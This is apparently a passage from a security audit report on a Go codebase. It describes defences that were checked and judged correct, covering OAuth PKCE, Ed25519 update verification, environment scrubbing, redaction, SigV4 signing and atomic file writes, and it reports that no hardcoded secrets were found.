**OAuth / PKCE (`kernel/chatgptauth`, `kernel/controlplane/provider_oauth.go`)** — PKCE uses S256 with a 256-bit verifier (`chatgptauth.go:313`–`:322`); `state` is 256-bit (`:325`) and **is** verified on the callback (`provider_oauth.go:109`). The callback listener is loopback-only with a 5-minute TTL and a `ReadHeaderTimeout`. Token exchange posts credentials in the request body, never in a URL. `jwtPayload` skips signature verification but is used only to read `exp`/`email`/`account_id` from the daemon's own stored tokens — correct scope for an unverified decode, and it matches sc-jwt's documented false-positive case.

**Ed25519 release verification (`kernel/update`)** — `ed25519.Verify` is used correctly against a length-checked public key (`:359`, `:363`); a malformed key is rejected rather than treated as absent-but-valid. `requireHTTPS` is enforced on the initial URL *and* on every redirect hop via a `CheckRedirect` hook (`:157`), with only loopback exempt. The HTTP client dials through a `netguard` SSRF guard. (Policy flaw is SEC-CRYPTO-001; canonicalization is SEC-CRYPTO-006.)

**`kernel/envscrub`** — strict allowlist rather than denylist, which is the right construction; `IsSecretName` is applied on top as belt-and-braces. Correctly consumed by the browser, coding, and acpagent tools. (The `credential_process` miss is SEC-SECRET-003.)

**`kernel/redact`** — patterns are appropriately specific; literals are sorted longest-first so a secret that prefixes another cannot be left partially exposed; `Placeholder` contains no JSON-special characters so substitution into marshaled JSON keeps it valid. (Coverage gaps are SEC-SECRET-007.)

**`kernel/creds/sigv4`** — client-side AWS SigV4 signer only; correct HMAC key-derivation chain (`AWS4‖secret` → date → region → service → `aws4_request`), correct canonical-request construction, no secret material in logs or URLs.

**`internal/atomicfile`** — unique temp file per write (no shared `.tmp` race), fsync before rename, chmod before rename so the target never exists with wrong permissions.

**No hardcoded secrets found in scope.** The `agentgw` `"change-me-in-production"` constant is confirmed gone and replaced by the per-install resolution chain in `secret.go`. `chatgptauth.ClientID` (`app_EMoamEEZ73f0CkXaXp7hrann`) is a public OAuth client identifier, not a secret — correct to have in source for a PKCE public-client flow.
